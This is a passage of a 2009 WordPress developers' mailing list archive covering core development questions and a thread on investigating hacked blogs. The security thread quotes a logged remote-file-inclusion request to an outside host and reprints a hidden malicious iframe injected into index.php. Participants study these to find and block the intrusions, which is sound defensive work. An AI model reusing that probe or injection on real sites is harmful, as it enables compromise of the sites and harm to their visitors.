used in different ways as well.  Some with side effects and some  
without.

It maybe that if the way you have approached the problem solution is  
to use a generic filter for a specific case rather than a specific  
filter.

It may be that the specific filter isn't available - but if you need  
more actions / filters please ask and you shall have them.

This is how a potential plugin should work:
Use the above function to go through all posts and convert the slugs. The
check I added would prevent slugs from being translated twice.

After that, the plugin would automatically translate slugs whenever new
posts are added. This would be done by setting the function as a filter on
'sanitize_title'.

I guess that would work too. I would have to edit the wp_posts table though
and add an additional priority number, which makes more sense though. Thanks
for the word of advice, I'd appreciate any others too.
Does anyone else have spam problems and a solution to it or is it just me?

Message-ID: <49CB1F28.60504@htcomp.net>

Hello,

I am updating the phpDocs for the wp-includes/post.php file and I have
noticed quite a few functions which start with a leading underscore
are not marked as private. Is this a phpDoc omission or are these
unmarked functions in some kind of transition?

I have a lot of other (phpDoc) changes to make in this patch and would
rather include these changes if they are needed.


For Example:

_future_post_hook() is marked private (second line).
[snip]
  * @since 2.3.0
  * @access private
  *
  * @param int $deprecated Not Used. Can be set to null.
  * @param object $post Object type containing the post information
  */
function _future_post_hook($deprecated = '', $post) {
[snip]


_save_post_hook() is *not* marked private.
[snip]
  * @since 2.3.0
  * @uses $wp_rewrite Flushes Rewrite Rules.
  *
  * @param int $post_id The ID in the database table for the $post
  * @param object $post Object type containing the post information
  */
function _save_post_hook($post_id, $post) {
[snip]

The function "get_the_time" will get the time for the current post.
Are you putting this code in the correct place in the Loop?

users.php did not work for a few days.
The script stops on "get_users_of_blog()" (in wp-includes/user.php)

We have more than 40 000 users on this install...
Server is a dedicated Dell, load average is ok (between 0.5 and 2,
while it had sustained before load of 30-60 for days)

Is there natural limits to WP specs concerning user database ?

just for info :
in wp-includes/user.php, line 235
line that breaks : $users = $wpdb->get_results( "SELECT user_id,
user_login, display_name, user_email, meta_value FROM $wpdb->users,
$wpdb->usermeta WHERE " . $wpdb->users . ".ID = " . $wpdb->usermeta .
".user_id AND meta_key = '" . $wpdb->prefix . "capabilities' ORDER BY
{$wpdb->usermeta}.user_id" );
with a limit, it works : $users = $wpdb->get_results( "SELECT user_id,
user_login, display_name, user_email, meta_value FROM $wpdb->users,
$wpdb->usermeta WHERE " . $wpdb->users . ".ID = " . $wpdb->usermeta .

This is a limit of the way get_users_of_blog() works -- I've run into
this myself. If there isn't already a bug ticket for it, open one.
We've come across users.php limits before... it used to run out of
memory at around 5,000 users.

Yes, I am. It is a simple loop. It displays post date followed by post
title. I have replaced the the_time() or the_date() call with echo
human_time_diff() . With the exception of the day it is published on,
it works fine for other days. On the day it is published, due to
perhaps time zones, it gets 'mungled', I think.

Here's what's happening:

Host server is in GMT -6.
I am publishing from GMT+1.

1 minute after publishing, it shows 5 hours ago, so appararently it is
doing this: abs(-6+1)= 5hrs ago.
1 hour later, it becomes, I think abs(-6+1+1)= 4hrs ago.
5 hours, 1min later, abs(-6+1+5)= 1min ago.
6 hours later, abs(-6+1+6)= 1 hour ago.
12 hours later abs(-6+1+12) = 7hours ago.

Does anyone else has seen this happening?

To add to my previous observation, and going by the logic, I need to
set my location time to match my server time, or else
human_time_diff() shows time erroneously for the day it is published.

Currently I've set my time as GMT +1 under settings. But if I set it
as GMT-6 (same as my server time instead of my actual location time),
then there would be no more time zone crossing point, and so the time
would continuously increase (not descend until it reaches your actual
time zone before ascending like I mentioned earlier). But then it
defeats the purpose of having a time zone setting in WordPress---at
least in this case.

Even if you aren't aware of the cause, could you point us to the
symptoms so we would know what to look for?

Sorry, should have included that immediately.

Symptoms were, in all cases, iframes being added to the end of all 
index.php files in the blogs, in the footer. In some cases they were 
written with javascript, in other cases they were pure iframes.

Do you have more info about the similarities of the blogs, like themes
and plugins?
Maybe even PHP, Webserver and MySQL versions?

No similarities there, PHP4 and 5, MySQL 4 and 5, Apache 2.0.54, 2.2 etc....

Recently restored a hacked blog myself with the similar symptoms...
A new vulnerability?

I wish I could help out in finding the problem but I have the user
agent libwww-perl blocked, so these request won't show up in my Apache
logs.

But the action op is not an action that's used a lot, so grepping for op
in your wp-content should give you a clue which plugin it the culprit. I
don't think it's WordPress itself, these two commands:
grep \'op\' * -r and grep \"op\" * -r
don't give me any results.

I was thinking of finding $_POST['op'] or $_POST["op"] or similar GET,
REQUEST.

Good luck and let us know your findings on the above grepping please.

I dont' see that particular request in my logs, but I see lots of 
attempts against a 'mygallery' plugin (which I don't have installed). 
They all get a 404, of course, but I'm guessing that this means that the 
'mygallery' plugin needs to be looked at.

Though these particular examples all used libwww-perl as the useragent, 
other hack attempt entries in my logs masqueraded as normal MSIE 
browsers. Personally, I think blocking the LWP useragent outright is a 
bad idea, because plenty of legitimate tools use it. It's like blocking 
'curl' or 'wget'.

First of I have to correct myself, the libwww-perl does show up in my
logs, my apologies.

As for blocking it: I don't believe it's a bad idea as the only tool I
can think of that in theory should be able to access my blog would be a
RSS reader. My main RSS feed is through Google, so only a RSS feed for
comments is accessed on my site and then the chance of somebody using a
Perl RSS reader is slim.

I just don't know of any other tool, written in Perl, that would have
to access my site.

I'd just like to remind everyone that it is trivially-simply to change 
the user agent string in libwww-perl. So, blocking that user agent does 
nothing to stop people who use randomly-generated user agents with their 
attack scripts while it does block people who create and use innocuous 
scripts for whatever reason.

The problem here isn't libwww-perl (or any other user agent for that 
matter); rather, it is whatever hole is being exploited. If we all just 
block the libww-perl user agent and pat ourselves on the back for a job 
well done, we'll be overrun when the exploiters simply change or 
randomize their user agent string.

As for the matter at hand, I'll be very interested to hear more details 
on the situation Joost. Have you found any leads on what is handling 
that op query string request?

Message-ID: <77c8b7bf0903260822o16f599e7x6666e685ba76f5a5@mail.gmail.com>

Maybe I'm approaching things wrongly, but the Walker classes make me
feel uneasy? As I type I'm extending Walker_Comment because I need
some different markup for my comments and (AFAICT) that means I have
to extend the Walker_Comment, override the start_el method and then
pass my new Walker to wp_list_comments. Which seems a pretty
significant act for what I would expect to be a simple template tweak.

The root of my disquiet is the amount of markup tangled up in the
Walker methods... it seems backwards, and is moving away from
logic/display code separation; not to mention making it non-trivial to
re-template the comments section. I understand that this is
complicated recursive code, but surely there's a better way?

No answers, sorry, just questions...

Thanks for listening.

Nope, can't find a bloody thing yet. These kind of requests:

GET /index.php?op=http://oursoultvxq.com/bbs/data/vip/id.txt???? HTTP/1.1

in all the logs, but grepping through the entire htdocs dir, nothing 
that responds to them.

I've restored two hacked blogs in the last week or so as well. One of them
involved the iframe in the index.php template. The other was a slightly
different situation, a text file with a ton of links written to a non-WP
directory on the account and pulled into the blog header via an include
statement.

I've been up to my ears in a database character set conversion on a third
site, but I'll check the logs as soon as I can.

Hi Simon,

no need, you can simply do a callback:

<?php wp_list_comments('type=comment&callback=yoast_comment'); ?>

the callback function can look like this:

function yoast_comment($comment, $args, $depth) {
     $GLOBALS['comment'] = $comment;
     comment_text();
}

or whatever you want to output there.

Best,
Joost

I don't believe that attack is what caused your problem.
The script that is called is a killroy script.
It will show server related information, like the OS, Uptime. Stuff
like that and "<insert name> was here .."

If the attacker is able to inject that chunk of code, other things  
could be include as well, eg: shell

Just to throw the idea out there. Is it possible that such requests are 
merely red herrings? In other words, could those requests be distracting 
away from the actual problem?

Looking at the code at the id.txt file, all that does is provide output 
to the calling script that verifies certain characteristics of the 
server. So, there probably is something else going on. Of course, it 
also confirms that the target is vulnerable to that vector of attack.

Exactly, it's a check.

Going through the access logs I can't find anything else yet though, 
what we DO see on one of the hosts is that the "infected" files were 
uploaded through FTP (we can see that in the xfer.log), but if I'm not 
mistaken, that could still be done through XSS right?

Can you try that URL on your web browser, since the remote file is  
still up?

All underscore functions should indeed be marked private.

There's not an off chance that your server has been using a program
call Xoops or any of its existing integrations with WP is there?

I too fixed a site that had this iframe problem, but it was a v2.6 site.  I know this was asked implicitly but let me ask again explicitly; is there any chance that these hacked sites shared any of the same plugins?  As Mark Jaquith tweeted about recently, plugin as a group are generally not written with good security practices in mind; maybe there's a huge security hole in a shared plugin?

I've always wanted a code search feature within the plugin directory like 
Google's one

Try using date_default_timezone_set('Etc/GMT+1'); before
human_time_diff(). It's PHP 5.2.x only though.

Collecting the data on that now, my guess is it's a plugin as well, but 
can't find one that they all use yet, but it seems some are 
continuations of others...

Hello Everybody

At once you all get laughed coz an instanace of WP should be installed on a
Server...

That is not what i'm talking...

I'm going to create a Client Server Architecture to Connect 2 or more
instance of WP
Then One Instance became a Server while others as Clents

By doing so

   1. can have a common loging system
   2. Blog Import - Export Fucntionality using HTTP or AJAX (without RSS)
   3. Synchronized publishing of Posts between Clients
   4. and many more..

need comments......

I've (repeatedly) fixed a string of blogs that are hosted on
DreamHost, and to be honest, at this stage I'm putting it down to an
"internal" security problem on DH. Another symptom you might want to
check for is a file called "wp-manager.php" in your wp-content
directory. It's a single script that basically gives anyone complete
access over your files etc (it's a file-manager) via a browser.

The reason I suggest that it's DH security and not necessarily WP is
that it seems like someone is running a script on the server that just
repeatedly hacks/modifies the contents of files on the server - it
even did its work on a couple of blogs that I have which weren't
publicly launched yet, but the files were there. From what I saw it
attacked all index.php files and the latest is adding links to the end
of header.php in all of my themes.

HTH someone (I'll be shifting to a different web host soon).

It is also worth noting that a security vulnerability in _any_ software running on the server with 
the right permissions could inject code into a wordpress install.

Subject: [wp-hackers] New Widgets API
Message-ID: <c8f37c930903261619n4541d841r5b68d1ab5bff07c9@mail.gmail.com>

In trunk is a new widgets API.  WP_Widget is a class that abstracts
away much of the complexity involved in writing a widget, especially
multi-widgets. Basically, you extend WP_Widget with your own class
that provides a constructor and three methods -- widget(), form(), and
update().  widget() outputs the actual content of the widget.
update() processes options to be saved.  form() outputs the options
form.  A widget is registered by passing the name of the widget class
to register_widget().  All widgets written with WP_Widget are multiple
instance capable.  Options for old single-instance widgets ported to
WP_Widget will be upgraded to the new multi-option storage format,
which is simply a multi-dimensional array keyed by instance ID.
Options for widgets using the old multi-instance pattern should work
as is.  If your widget has custom option storage needs, you can
provide your own get_settings() and save_settings() methods.

 The WP_Widget source can be viewed here (read the phpdoc for more
info on usage):

http://core.trac.wordpress.org/browser/trunk/wp-includes/widgets.php

You can see examples of how to use it here:

http://core.trac.wordpress.org/browser/trunk/wp-includes/default-widgets.php

If you author any widgets, try porting them to WP_Widget and give your
feedback on what can be improved.  The trac ticket is:

http://core.trac.wordpress.org/ticket/8441

Do you mean something like MySQL's replication, where one install acts
as MASTER while another acts as SLAVE?

What's the use-case for this scenario? e.g. Why would I want to be
able to do this, rather than just replicating the entire blog if
that's what I wanted to do.

The only scenario I can think of (which seems like a bit of a
different issue) would be the ability to log into one WP install, and
(optionally) publish a post over to a different WP install.

Is that the sort of thing you're hoping to allow?

Hi,

The hacked blog(s) run on a shared-hosting or private/dedicated server?

Cause there is possibility that the wordpress blog/site wasn't
directly attacked and it was a random site inside the shared-hosting
environment and if this hosting is improperly configured/secured the
attack could be triggered from that second site (or worse, the "worm"
could root the server and start spreading the infection all over the
server pages).

I have encounter this scenario tons of times (50>) in all, i was able
to edit other users pages or well even became root on the server...
Best shot you have (in order to prevent further attacks) is to contact
the sys-admin(s) and pray they make the necessary changes to secure
the environment.

No, that doesn't make any sense unless you set your time zone wrong to
start with.

Look at your code:
<?php echo human_time_diff(get_the_time('U'),
current_time('timestamp')) . ' ago'; ?>

get_the_time('U') gets the timestamp of the post, as WordPress thinks
it is. So it's accounting for the time zone setting there, or, at
least, the time zone that the blog was set to when the post was made.

current_time('timestamp') gets the time with time zone setting accounted for.

human_time_diff doesn't care about time zones. It's taking two
absolute times and getting their difference.

On the settings page, your time zone should be YOUR time. The "server
time" should always be the absolute UTC/GMT time, regardless of what
time zone it's in. The important point here is that after you've set a
time zone on the settings screen, then it will show you your local
time, where you happen to be sitting at. Where the server is located
is irrelevant.

Also as an aside.

Do this sites share anything else in common?

Are they all on shared servers?
What other webapps are installed?

And the more underscores we use in the names the more private they

I'm curious Joost. If you do that request to the site, does the exploit 
work. It's possible that it doesn't even work and isn't worth time 
investigating.

Here's the Codex page: http://codex.wordpress.org/Template_Tags/wp_list_comments

It's not the most obvious setup in the world, but it is really useful
and makes it easy *enough* to control your comments html formatting.
Definitely easier than messing with the walkers.

A similar situation was reported on December 22, 2008 by madalin
[QOUTE]
Yes that's exactly what i am saying. Here is my index.php:

<?php
/**
 * Front to the WordPress application. This file doesn't do anything,
but loads
 * wp-blog-header.php which does and tells WordPress to load the theme.
 *
 * @package WordPress
 */

/**
 * Tells WordPress to load the WordPress theme and output it.
 *
 * @var bool
 */
define('WP_USE_THEMES', true);

/** Loads the WordPress Environment and Template */
require('./wp-blog-header.php');

// echo "<iframe src=\"http://thedeadpit.com/?click=17470781\" width=1
height=1 style=\"visibility:hidden;position:absolute\"></iframe>";
?>  
[/qoute]

The echo was commented out to keep for future reference according to the
OP.

No final verdict was given. The iframe was also found in non WordPress
related sites.

Well that's better than overriding a class, etc, as I'd assumed;
however it's still not as simple as modifying single.php or most of
the other templates, also with the new threaded commenting the
callback function would need to be fairly complex... I know I'm
moaning, and I know this is recursive and relatively complex code, but
do you see where I'm coming from? Maybe I should stop going on as I
don't have a code solution for this.

AFAIK:

In order to upload through FTP you will need a username and password,
unless you can upload to any directory anonymously, which is bad.
FTP usernames and password are normally not held on a web server, again
if you run a script that can do FTP uploads, it's bad.

I believe a local machine, Windows/Mac/Linux, is infected with a virus.
Do the site(s) share the same username/password?
Who has FTP access to the site(s)?

Change the password of the user who uploaded the infected file and try
to find out from which user/IP it came. Anybody who has FTP access has
to thoroughly inspect their machine(s).

Yes, the callback is the easiest way if you want to mess with the
markup itself, but really, you should consider whether or not it is
necessary to mess with the markup first. Okay, in some cases it's
unavoidable, but ideally, most anything you want to change should be
editable via either CSS or filters.

If you want to use some wholly different style for comments, then you
should consider whether or not it might be better to attempt using the
default style first. There's significant advantages to standardizing
comment display markup, and sticking to the "standard" is much
preferred.

Moaning?

No, I'll rather think not, because it appears that WordPress attempts to 
back-port SPL and PHP5 features without attempting to forward think 
about how difficult it is going to be. Most likely to support SPL, a new 
class or set of classes will have to be developed (most likely will be 
the implementation to maintain backwards compatibility).

I mean, this kind of does prove someone's[1] statement about how 
anything in PHP5 can be done in PHP4, but it does prove my point as to 
why you would want to deal with the hassle. I write Iterators all of the 
time and major trickery and data manipulation. With an Iterator, you 
would have full control of the output, without having to pass you an 
array, so WordPress will have full control of the data.

Also, the shitty part of it all, is that when the Walker classes are 
ported to PHP5, the Walker class will not be able to be made abstract, 
because the classes which extend the "prototypes" add parameters which 
are not part of Walker class. Therefore, PHP5+ will go up in smoke, if 
you attempt it or you could attempt to fix the prototypes of the 
methods, but then you have to go back and correct the code that depends 
on those parameters.

Well, I guess I'm done ranting. I object to some of the design 
decisions, but I'm not going to spend the time to "correct" them.

Jacob Santos

[1] I'm often accused of insulting him when I have no intention, so I'll 
leave his name out. He is more intelligent than I give him credit for, 
hell, he makes a lot more money than I do, so in that case he is far 
more intelligent than I am. If you don't know who I'm talking about, it 
doesn't matter, if you do, then know I'm not trying to be mean by 
pointing him out. He is a central figure, so he is often used as an example.

ok, would anyone be interested in using one if i coded it? :P

i need to add users and sites to a wpmu system programmatically and want to
avoid the headaches involved with including wordpress libraries into another
system.

Message-ID: <C92A6714B47B4275A9CF7849D632FC67@inspire>

I have a client who is experiencing some serious performance issues. In some
cases, 30+ seconds for a single page load.  We discovered that a single page
load is making ~275 queries, which seems to be an incredibly large quantity
considering the other sites I tested make less than 30 queries.

 

Any suggestions for tracking down the offending code, or producing a log of
the queries being made during the page lifecycle?

In wp-config.php:

define( 'SAVEQUERIES', true );

And in the template's footer:

<?php if ( current_user_can( 'manage_options' ) && isset(
$_GET['dbdebug'] ) ) { var_dump( $wpdb->queries ); } ?>

Then just log in to the WP install, and add ?dbdebug=1 to the URL in
question, and you'll get the breakdown of the queries in the footer.
With that number of queries, it's likely a plugin gone wild.

Yeah, doing that on all those servers now. Unfortunately, MT, even 
though it's on WordPress's recommended list, just says "you're on your 
own". Anyway, moving those ppl over to another host, and increasing 
security on the other sites. I can't find it :)

Hello Beau,

Thanks for commenting...

My System doesn't comaparable with Basic Replication coz Ma System does even
work in the following situations also.
   1.If the user doesn't ve any facility to replicate or he doesn't know
how-to
   2.And Synchronize data and infromation with more filtering
   3.Replication doesn't have Remote Method Invocation (RMI)

*My System Work like this..*

1. Clients have to implement a Interface of functions in order to get
connected with the server WP Instance..
2.If the any network,blog or Social Networking site implements the Interface
they can connect..
3. That means Interoperatability between above can be ocurred..

*Basically It can do following*
**
1.Sharing the User base...
2.Share post between clients and Server
3.RMI - Used to create Remote Management of Clients via Server...

So all that best thing is this is based on Wordpress (WP Rox)

   3.Replication doesn't have Remote Method Invocation (RMI)

*My System Work like this..*

1. Clients have to implement a Interface of functions in order to get
connected with the server WP Instance..
2.If the any network,blog or Social Networking site implements the Interface
they can connect..
3. That means Interoperatability between above can be ocurred..

*Basically It can do following*
**
1.Sharing the User base...
2.Share post between clients and Server
3.RMI - Used to create Remote Management of Clients via Server...

So all that best thing is this is based on Wordpress (WP Rox)

Ok....

WP 2.7.1 hacked.
On VPS with one other domain. The other domain contains one single
index.html file.
Both are jailed.

Running PHP 5.2.5 MySQL4.1
suexec running, server hardened.
register_globals off
url fopen off
trackbacks disabled
xml-rpc disabled

The site is running the following plugins:

Akismet
Google Sitemaps
Configure SMTP
Tweetbacks
Subscribe to Comments
Syntax Highlighter
Insights
Drainhole

There are a number of entries in the logs showing 200 responses where
nothing appears to have got in (or, at least I haven't found the
payload yet).
There are also a number of attempts to run base64 code appended to
wp_cron that have resulted in 500 errors.

Agent: libwww-perl/5.803 used in all suspicious log entries.

Attempts to download the txt files used have so far been unsuccessful.
I will continue digging to see what I can pinpoint.

Message-ID: <a01acb9c0903270409s2ab2df65v6b59d0b23f0ee236@mail.gmail.com>

Hey everyone,

I'm planning on submitting a couple of proposals to GSOC this year, and
would be grateful for any feedback.

1) Centralized Plug-ins

The first idea is to have some centralized way of managing the plug-ins
installed in Wordpress.  Basically, instead of having each plug-in install
itself wherever it wants on the dashboard (which gets unwieldly once you've
installed a bunch of plug-ins), there will be a centralized locations that
users can go to configure all there plug-ins.  No more searching around the
dashboard to figure out which plug-in went where.

2) Voting Plug-in for Wordpress

User interaction is all the rage with Web 2.0, with sites like Digg and
Reddit harnessing the wisdom of the crowds to sift through the mounds of
content available on the Internet.  It would be cool if WordPress came with
a plug-in that gave users this functionality right out the box.  Visitors to
the site would be able to submit content, and other visitors would be able
to vote on it, adding another layer of interactivity to Wordpress blogs.

3) Enhance the WordPress Video Solution Framework

Video is going to be big in the next few years, since video cameras will
become ubiquotous once they come standard on all cellphones.  WordPress
needs a better way of dealing with video to handle this deludge.  Some
features that could be added to video on WordPress include screeshot
previews, integrated adds, and social features such as showing related
videos (a la YouTube).

4) User Roles

The WordPress roles/capabilities system could use an upgrade. The current
system is a little clunky, and is missing key functionality such as the
ability to limit an author to a specific category, setting permissions for
viewing/altering/moderating content (currently very basic), and on the back
end it is hard to query for "users who have capability X" etc.

Thanks for your time!

Many thanks! I'm surprised I didn't know about these already. When you ask
the experts, you get the right answer. Will try it right away, I suspect
this will help to track down the issue with ease.

Hi all,

Doing something pretty basic but its not working...

I have WP installed as usual, with a 'wp_' table prefix. I've just installed
WP again into the same db, with a different prefix, and added the following
to its wp-config.php:

define('CUSTOM_USER_TABLE', 'wp_users');
define('CUSTOM_USER_META_TABLE', 'wp_usermeta');

However, when I try to log in I get the infamous message:
"You do not have sufficient permissions to access this page."
I've seen a few discussions about this in wp-hackers archives...but no
solutions! Any ideas guys?
Cheers,
Alex

It's usually because the user doesn't actually have a defined role on the
second blog.  Use phpMyAdmin or the suchlike and take a careful look at the
[prefix]_usermeta table and the [prefix]_ capabilities records.  See how
they differ to the [prefix2]_capabilities entries.

Message-ID: <6202bd0903271853o3b4a428se49a7690038fe757@mail.gmail.com>

I was wondering if there was a plug-in already created that would let a
person log in and instead of going to the admin console, let them edit posts
in-place. This would be helpful if a certain title is too large for one line
or if the image is off. I have already seen the "edit n place" one here
http://www.johntp.com/2006/09/01/wordpress-plugin-edit-n-place/ but I was
wondering if there were any other? I was thinking of one that would let you
drag and drop boxes and such. Thanks!

Just a minor remark on FTP which might be useful:

A lot of people use wireless anywhere they can, while forgetting that FTP
credentials are sent in plain-text making it very easy for a bad-guy to sniff
the passwords by using a compromised wifi access point. Make sure you use a
secure encrypted connection (for instance SFTP) for all your network traffic
when using wifi accesspoint you do not control.

Hope you'll find the culprit sooner than later.

All the best,
BjornW

Hey,

(you may read the replied-to-mail first, been a while)

bookmarked it a while ago ;) Now i tried to use it and its not
working. The reason, as far as i can see, is that you need to put the
ID of the attachment and not the ID of the post into the
function-call. So it is not as handy as it seemed first.

Its 4 o'clock in the morning (down here in Germany). I don't see it:
How can I retrieve the ID of the first attached Picture of a post? I
mean: Is there any easy WP-Way or do i have to parse the content?

Kind regards
Jan

If at all possible for your site add Suhosin to your PHP install. 
That'll help stop all sorts of bad stuff targeted directly at or through 
PHP.

http://www.hardened-php.net/suhosin/

If you've got a shell with root access you can probably find a 
ready-made package to install. Otherwise you'll have to download it and 
compile it yourself. Not a big deal, but more work.

Message-ID: <349fe48b0903270823k4f33f363l624f96a63327c72e@mail.gmail.com>

This is the order in which hooks are currently called in admin-header.php:

do_action('admin_enqueue_scripts', $hook_suffix);
do_action("admin_print_styles-$hook_suffix");
do_action('admin_print_styles');
do_action("admin_print_scripts-$hook_suffix");
do_action('admin_print_scripts');
do_action("admin_head-$hook_suffix");
do_action('admin_head');


Wouldn't it make more sense first to call the general hooks, and then the
ones with $hook_suffix ? I was trying to add some inly jQuery to a
particular page and got the "jQuery is not defined" error because jquery was
added bellow my script.

I realize now that I could have just used "admin_head-$hook_suffix" instead
of "admin_print_scripts-$hook_suffix", but is there any reason for adding
particular scripts and styles before general styles?

Could have easily been some other vulnerable Web app that provided the 
inroad.

I've seen that exact same file (wp-manager.php) along with several 
others on a diverse array of hacked hosts. Never seen it on DH though, 
and I manage a plethora of customer sites over there.

I recently released an update to a plugin (Featurific for Wordpress) and 
noticed that the 'upgrade blurb' has not shown up on any of my test 
sites.  I have several test sites running different versions of 
Wordpress in slightly different configurations, and the 'update blurb' 
has not shown up on any of them.  This is the 'update blurb' to which I 
am referring, in this case, for the WP-Syntax plugin:

There is a new version of WP-Syntax available. Download version 0.9.3 
here or upgrade automatically.

Any ideas what might be going on?  I've verified that the new version 
(1.5.0) has actually posted to the plugin directory 
(http://wordpress.org/extend/plugins/featurific-for-wordpress/), so that 
can't be the problem.  In the past, the blurb has been available, but 
with this release, no dice.

Thoughts?

tia,

I had already recommended this to the site owners and both got refused
by their hosting companies (I can't think why, with the VPS, but it
might be a managed VPS I guess).

The biggest problem I find in situations like this is that people
rarely believe anything other than the app can be at fault. I could
yet be proven wrong but I can't find any evidence that WordPress
itself was open to these attacks.

It seems Joost's Twitter post telling everyone to keep an eye on their
blogs is getting attention. I had another person report the same hack,
but this time on WP2.6.5.

Plugins in common were only Akismet, Tweetbacks and Google Sitemaps.

BUT, both sites are using the same premium/commercial theme which
contains a lot of code.
This may be coincidence but I couldn't spot any vulnerabilities in the
plugins they have in common, or in their server setup. If there is a
common vulnerability in 2.6.5 & 2.7.1 I didn't manage to find it.

I was careful not to suggest the theme is the culprit but have advised
them to contact the theme developer (hope they don't go off saying I
am casting aspersions on the theme!!!!)

I've already talk about you what the I'm going to to do
and details can be access using
  here->
          http://kadirasays.co.cc/wordpress/?p=8

What I'm going to is breifly is create a Server on a Wordpress that is able
to connect client....
So those clients and other clients and Server can communicate each other..

Client can be any othe wp instance,other blog or ....

The basic reason for this if an organization/person deals with many more
networks,blogs....
They can synchronize data between this Client Server Archi......

eg:-
 once a client of my network posted a new post.. that also can be viewed
from other blogs..
 users in the clients are inter connected...(they can log in
inter-clients)....[this is works upto sme extent]
 once user make some changes in the twitter (organizations- not each user)
that is viewable via other clients(vise versa)


I just want to know that is this seems worth for you...
Or is there any plugins or some others do the same thing...

Ok!, 	I now have a better idea about what is required (and more or

can't be the problem.  In the past, the blurb has been available, but 
with this release, no dice.

IIRC, WordPress will only check for plugin updates every 12 hours.
Have some patience. ;)

Subject: [wp-hackers] Two GSoC Ideas: Default Theme Framework and
	Community/Event Organizing
Message-ID: <48c2f39e0903271335s830be88h9653ccd7cbd5cf33@mail.gmail.com>

Hello,

I'll be submitting two proposals to GSoC for WordPress, and would like the
wp-hackers community's views, suggestions, and general feedback on my ideas.

========================================

PROPOSAL #1:

Create a default theme framework for WordPress, as suggested in the
following entry from the Codex GSoC2009 Idea
List<http://codex.wordpress.org/GSoC2009>
:

"It's been said that 2009 will be the year of the theme. Possible projects
in this area could include things like creating a new theme framework for
inclusion as a default theme, or putting together a set of plugins with a
theme framework to make use-specific packages like BuddyPress is for social
networking... projects could do the same for event planning, CMS,
education/online learning, media-based sites (using WordPress.tv as test
case), etc."

My idea is to create a default theme framework for WordPress, along with at
least three child themes:

a) one in a blog style that is traditional to WordPress,
b) one in the style of a "static" website (for when WordPress is being for
content management rather than blogging), and
c) one in a magazine style that combines elements of the blog and static
website child themes.

Each of these child themes could be directly downloaded and installed from
within the WordPress installation (probably from the options page for the
parent theme) for a user-friendly experience.

The parent and child themes would be:

a) written in semantic XHTML and CSS,
b) search-engine optimized,
c) widget-ready, and
d) (perhaps most importantly) will keep up with WordPress development.

Further child themes could also be created by members of the community.

========================================

PROPOSAL #2:

Create a WordPress-based event organizing platform, as suggested in the
following entry from the Codex GSoC2009 Idea
List<http://codex.wordpress.org/GSoC2009>
:

"Create a suite of plugins for event planning, tie it into WordPress
MU/BuddyPress/bbPress, and create a community organizing platform for open
source release. Using WordCamp.org as the test case, the resulting site
would include functionality for registration, calendaring, additional
roles/permissions, extended profiles, directories (vendors, participants,
etc), discussion and messaging, coordination around things like carpooling
and planning meetings, event media, etc."

My idea is to create a plugin pack for WordPress MU that could be downloaded
through the Plugin Gallery in a single click. Downloading this pack would
make a variety of plugins and themes available for activation, with each
individual subplugin or theme able to be separately activated or deactivated
as needed for the individual system.

Possible child plugins and.or theme components to include are:

a) a registration plugin that modifies the basic WordPress user registration
system with the addition of various types of registrants -- planners,
attendees, vendors, etc. This plugin would also allow the modification of
permissions for different types of registrants.
b) a event fees plugin that tracks and charges different fees for different
registrant types -- no fees, attendee registration fees, vendor table
reservation fees, etc. This plugin is dependent on child plugin A, the
registration plugin, and would include an e-commerce element.
c) BuddyPress. Various components of which can be used for social networking
(extended profiles, interest groups, group discussion forums, friends,
private messaging, etc.). Examples of group discussion forums include
private forum for event planners and public ones for organizing carpools
from a specific area.
d) a calendar feature that allows for event deadlines, as well as a schedule
for the days of the actual event
e) automatically generated directories for planners, vendors, participants,
etc. These directories would be themeable through a page template.
f) a page template for event media and press information, with the ability
to add logos and PR contact information.

Due to the larger scope of this project, I suspect that there will not be
enough time to implement all of the possible child plugins during the time
constraints of the Summer of Code. If this is so, my initial inclination to
give preference to child plugins A, B, and D for registration roles,
registration fees, and calendaring.

In addition, I would like to include bbPress as a possible child plugin in
the base plugin pack installation for publicly accessible discussion
forum(s) about events, but I need to do more exploration into whether
bbPress can be integrated into a WordPress MU installation through the
Plugin Gallery. (I suspect not, but need to research further whether it is
possible, whether it is even desired, or if there are already plans to do
so).

========================================

Thanks for reading and I'm looking forward to your comments,
Marteki

Subject: [wp-hackers] PHP compatibility
Message-ID: <FF1843F3-E606-4E08-A3EF-A7C1A76E1B6C@indiana.edu>

Just a thought about PHP and MySQL compatibility for the future. There  
was some talk on trac ticket 8701 about the deprecated warnings that  
PHP 5 is throwing about assigning the return value of new by  
reference, and then, with PHP 5.3, magic quotes are deprecated, and in  
6 will be removed (see trac ticket 9394).

There was talk in 8701 about adjusting the error reporting levels to  
account for the warnings, but I think this not a suitable fix. If  
backwards compatibility is to be maintained, there will only be more  
and more of this to deal with. Personally, I would branch off at this  
point with a version of WordPress for PHP < 5, and continue  
development requiring v5 or higher. I don't know that many would agree  
with me on that, though, so I have another idea.

It would be possible to read the user's configuration and rewrite  
certain core files to accommodate, using a method rather like IE's  
conditional code we use for loading IE version specific CSS. Any time  
in the code where there is break with compatibility between versions  
of PHP, you could put in conditional statements that would contain  
version appropriate code. During install (or update, or something  
similar), the file is read, the conditions checked, and the file  
rewritten with the conditions removed. If the file is, for whatever  
reason, not writable, it's just ignored, and acts as it would have  
otherwise.

I've implemented a rough functionality to this effect, and it works  
pretty well (files are attached here http://core.trac.wordpress.org/ticket/8701) 
. The conditions are only checked during install, but could  
conceivably run as an update any time the configuration changed (much  
as the DB update wizard runs with the schema changes). What I've  
implemented also checks for MySQLi functionality, as that is what I'm  
using on my server.

I realize this will complicate development, but complication in some  
form is unavoidable if backwards compatibility is to be maintained.  
Any thoughts on this approach?

No. No no no. Maybe.  :)

First -- My recommendation is that plugin backend interface should be  
designed to fully integrate with the Admin section, rather than  
screaming "Hey! I'm a plugin!".  I don't need to be reminded what's a  
plugin and what's not -- I just want the functionality.

Please read: http://striderweb.com/nerdaphernalia/2008/06/on-plugin-design/

Second, plugin authors can easily link to their plugin's admin page by  
adding Action Links from the Manage Plugins screen.  A tutorial here: http://striderweb.com/nerdaphernalia/2008/06/on-plugin-design/

Third, there IS room for improvement, despite the above.  There are a  
lot of plugins that have a very simple "set and forget" setup.   
Akismet is a good example -- we have an entire admin screen (and menu  
item) so you can enter a number into a blank.... and then never look  
at it again.  It would be nice to have a consolidated "Setup" system  
of some sort that plugin authors could hook into for such plugins.

Two possibilities here:

1) A separate page under the Plugins menu that plugins can hook into  
to add a setting field (box) for their plugins.  Settings for all  
plugins that use this (plugin author's discretion though -- don't try  
to force it) show up on the one page.

2) Do it directly on the Manage Plugins Screen.  A plugin row could  
have a little "flip down" arrow that opens up a small integrated setup  
pane right under the plugins's row (think about the "Update available"  
